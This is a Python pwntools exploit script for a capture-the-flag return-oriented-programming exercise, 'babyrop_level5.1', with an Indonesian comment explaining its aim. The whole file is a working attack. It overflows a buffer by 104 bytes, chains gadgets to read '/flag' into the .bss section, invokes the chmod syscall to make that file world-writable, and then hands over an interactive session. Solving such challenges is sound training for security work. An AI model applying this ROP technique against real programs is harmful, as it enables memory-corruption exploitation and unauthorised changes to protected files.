from pwn import *

elf = context.binary = ELF('/challenge/babyrop_level5.1')

#sama seperti level 5.0 ini akan men exec kode seperti ini chmod("/flag",0777) 0777 dalam bentuk octal

p = process()

offset = 104
bss_addr = 0x00404050
flag = b'/flag\x00'

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

payload = b'A'*offset
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss_addr)
payload += p64(pop_rdx) + p64(len(flag))
payload += p64(pop_rax) + p64(0)
payload += p64(syscall)

#p.sendline(flag)

payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(pop_rsi) + p64(0x1ff)
payload += p64(pop_rax) + p64(90)
payload += p64(syscall)

#p.sendline(flag)
p.sendline(payload)
p.sendline(flag)
p.interactive()
